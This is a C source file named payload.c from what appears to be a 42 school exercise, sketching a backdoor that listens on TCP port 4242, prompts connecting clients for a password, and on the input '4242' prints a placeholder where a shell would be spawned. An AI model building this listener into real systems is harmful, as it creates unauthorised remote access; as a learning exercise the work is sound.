/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   payload.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: bccyv <bccyv@student.42.fr>                +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/11/15 19:41:10 by bccyv             #+#    #+#             */
/*   Updated: 2021/11/15 23:46:41 by bccyv            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <syslog.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <durex.h>
#include <stdio.h>

#define MAX_CLI_NUMBER 3
#define PORT 4242
#define BUF_SIZE 32

int sock_init(int port)
{
	int sockfd;
	struct sockaddr_in addr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
		return (-1);

	memset(&addr, 0, sizeof addr);
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = htons(port);

	if (bind(sockfd, (struct sockaddr *)&addr, sizeof addr) < 0 || listen(sockfd, FD_SETSIZE) < 0)
	{
		close(sockfd);
		return (-1);
	}
	return (sockfd);
}

int accept_new_connection(int sockfd, t_cli *clients, size_t clients_size)
{
	int confd;

	confd = accept(sockfd, (struct sockaddr *){0}, (socklen_t *){0});
	if (confd < 0)
		return (-1);

	for (size_t i = 0; i < clients_size; i++)
	{
		if (clients[i].confd == 0)
		{
			clients[i].confd = confd;
			clients[i].is_typing = 0;
			return (confd);
		}
	}
	close(confd);
	return (-1);
}

int read_from_client(t_cli *client)
{
	size_t msg_len;
	char buf[BUF_SIZE] = {0};

	msg_len = recv(client->confd, buf, BUF_SIZE, 0);
	if (msg_len == 0)
	{
		int confd = client->confd;
		close(client->confd);
		memset(client, 0, sizeof(t_cli));
		return (confd);
	}
	// if (msg_len == BUF_SIZE)
	// 	sock_flush(client.confd);

	if (strcmp(buf, "4242\n") == 0)
	{
		printf("spawn a shell for %d\n", client->confd);
	}
	return (0);
}

int serve(int sockfd)
{
	t_cli clients[MAX_CLI_NUMBER] = {0};
	fd_set rset, wset, rtmp, wtmp;

	FD_ZERO(&rset);
	FD_ZERO(&wset);
	FD_SET(sockfd, &rset);

	while (1)
	{
		rtmp = rset;
		wtmp = wset;

		// remove prompted clients for password from tmp write set
		for (int i = 0; i < MAX_CLI_NUMBER; i++)
		{
			if (clients[i].is_typing)
				FD_CLR(clients[i].confd, &wtmp);
		}

		select(FD_SETSIZE, &rtmp, &wtmp, NULL, NULL);

		// Accept new client
		if (FD_ISSET(sockfd, &rtmp))
		{
			int confd = accept_new_connection(sockfd, clients, MAX_CLI_NUMBER);
			if (confd > 0)
			{
				FD_SET(confd, &rset);
				FD_SET(confd, &wset);
			}
			continue ;
		}

		// Prompt clients from tmp write set to enter the password
		for (int i = 0; i < MAX_CLI_NUMBER; i++)
		{
			if (FD_ISSET(clients[i].confd, &wtmp) && !clients[i].is_typing)
			{
				send(clients[i].confd, "Password: ", 10, 0);
				clients[i].is_typing = 1;
			}
		}

		// Read from client and update their state
		for (int i = 0; i < MAX_CLI_NUMBER; i++)
		{
			if (FD_ISSET(clients[i].confd, &rtmp))
			{
				int confd = read_from_client(&clients[i]);
				if (confd > 0)
					FD_CLR(confd, &rset);
				else
					clients[i].is_typing = 0;
			}
		}
	}
	return (0);
}

int payload()
{
	int sockfd;

	sockfd = sock_init(PORT);
	if (sockfd < 0)
		exit(EXIT_FAILURE);

	serve(sockfd);

	close(sockfd);
	return (0);
}
